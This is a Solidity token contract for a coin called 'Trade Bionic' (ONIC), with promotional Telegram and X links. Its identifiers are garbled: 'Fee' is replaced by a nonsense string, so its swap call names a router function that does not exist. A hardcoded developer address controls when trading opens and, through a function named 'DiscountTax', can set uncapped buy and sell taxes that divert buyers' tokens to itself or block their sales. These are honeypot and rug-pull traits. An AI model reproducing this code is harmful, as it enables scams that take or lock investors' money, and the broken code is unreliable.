/*

Telegram: https://t.me/tradebionic
X: https://x.com/tradebionic

*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingghbsdjfkgOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract ONIC {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = unicode"Trade Bionic"; 
        string public   symbol_ = unicode"ONIC";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyghbsdjfkg = 0;
        uint256 sellghbsdjfkg = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed ONIC_DEV_MASTER,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant ONIC_DEV_MASTER = payable(address(0xF3410899CA5aF5A0793B93c92e0b394487829f0D));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == ONIC_DEV_MASTER || to == ONIC_DEV_MASTER);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingghbsdjfkgOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                ONIC_DEV_MASTER.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 ghbsdjfkgAmount = amount * (from == pair ? buyghbsdjfkg : sellghbsdjfkg) / 100;
                amount -= ghbsdjfkgAmount;
                balanceOf[address(this)] += ghbsdjfkgAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradingOpen() external {
            require(msg.sender == ONIC_DEV_MASTER);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _DiscountTax(uint256 _buy, uint256 _sell) private {
            buyghbsdjfkg = _buy;
            sellghbsdjfkg = _sell;
        }

        function DiscountTax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != ONIC_DEV_MASTER)        
                revert Permissions();
            _DiscountTax(_buy, _sell);
        }
    }